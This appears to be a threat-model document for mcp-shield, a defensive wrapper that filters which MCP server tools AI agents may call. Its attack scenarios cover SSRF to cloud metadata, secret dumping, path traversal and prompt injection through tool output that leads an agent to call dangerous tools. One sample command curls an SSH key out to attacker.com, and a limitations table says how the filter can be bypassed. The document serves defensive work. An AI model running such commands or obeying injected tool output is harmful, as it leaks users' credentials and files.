# mcp-shield Threat Model

## What are we protecting?

Any system where an AI agent (Claude, Cursor, Copilot) connects to external
MCP servers. The assets at risk are:

- Environment variables (API keys, tokens, credentials)
- Local filesystem (SSH keys, config files, secrets)
- Internal network (cloud metadata, private services)
- Host process execution (arbitrary command running)

---

## Who are the attackers?

### 1. Malicious MCP server author
A developer publishes an MCP server that looks useful but contains hidden
tools designed to exfiltrate secrets or perform SSRF when invoked by an AI.

### 2. Compromised legitimate server
A trusted MCP server gets compromised via supply chain attack. Its tools
are hijacked to perform malicious actions.

### 3. Prompt injection via tool output
An attacker plants malicious instructions in data that an MCP tool reads
(e.g. a file, a web page). The AI follows those instructions and calls
dangerous tools.

### 4. Overprivileged tool design
A well-intentioned developer builds tools with too broad access — not
malicious, but dangerous if the AI calls them unexpectedly.

---

## Attack Scenarios & mcp-shield Response

### SSRF to Cloud Metadata Endpoint
**Attack:** MCP server calls `ssrf_fetch` with URL `http://169.254.169.254/latest/meta-data/`
to steal AWS IAM credentials.

**Real example:** HackerOne report on SSRF in MCP HTTP transport OAuth implementation.

**mcp-shield response:** 
- `ssrf_fetch` not in `allowed_tools` → BLOCK at allowlist check
- Even if tool name is disguised, argument scanning detects `169.254.169.254` → BLOCK
- Nested arguments scanned recursively — obfuscation doesn't help

---

### Secret Theft via Environment Variables
**Attack:** MCP server calls `read_secrets` to dump `os.environ` containing
API keys, database passwords, cloud credentials.

**mcp-shield response:**
- `read_secrets` not in `allowed_tools` → BLOCK
- Docker sandbox runs with `--env` restricted — host env vars never passed in

---

### Arbitrary Command Execution
**Attack:** MCP server calls `exec_command` with `cmd: "curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"`

**mcp-shield response:**
- `exec_command` not in `allowed_tools` → BLOCK
- Docker sandbox runs `--cap-drop=ALL` — even if executed, capabilities are stripped
- `--read-only` filesystem — SSH keys inaccessible

---

### Path Traversal
**Attack:** Tool argument contains `/etc/passwd` or `../../.ssh/id_rsa` to
read sensitive files.

**mcp-shield response:**
- Argument scanning detects `/etc/passwd`, `/etc/shadow` patterns → BLOCK
- Docker sandbox `--read-only` prevents writes even if read succeeds

---

### Internal Network Pivoting
**Attack:** MCP server uses `ssrf_fetch` to reach internal services at
`http://192.168.1.1/admin` or `http://localhost:6379` (Redis).

**mcp-shield response:**
- `localhost`, `127.0.0.1` patterns in blocked_arg_patterns → BLOCK
- Docker sandbox `--network=none` — no network access at all in strict mode

---

## What mcp-shield Does NOT protect against

Being honest about limitations is important:

| Limitation | Why |
|---|---|
| **Semantic attacks** | mcp-shield checks tool names and argument strings, not meaning. A tool called `helpful_assistant` that exfiltrates data bypasses name checks. |
| **Encrypted/encoded payloads** | If an argument is base64-encoded, pattern matching won't catch it unless decoded first. |
| **Trusted tool abuse** | If `safe_tool` is allowed and later does something dangerous, mcp-shield won't stop it — the allowlist trusts it. |
| **Side channels** | Timing attacks or covert channels via allowed tools are not detected. |
| **Zero-days in MCP SDK** | mcp-shield wraps the MCP server, not the SDK itself. |

---

## Defense in Depth

mcp-shield is one layer. Use it with:

1. **Minimal allowlists** — only allow tools you explicitly need
2. **Strict policy for untrusted servers** — use `policies/strict.yaml`
3. **Network isolation** — `--network=none` in Docker sandbox
4. **Regular auditing** — review `/audit` logs for unexpected patterns
5. **Principle of least privilege** — don't run MCP servers as root

---

## Security Policy

Found a vulnerability in mcp-shield itself? Please open a GitHub issue
marked `[SECURITY]` or contact via GitHub.
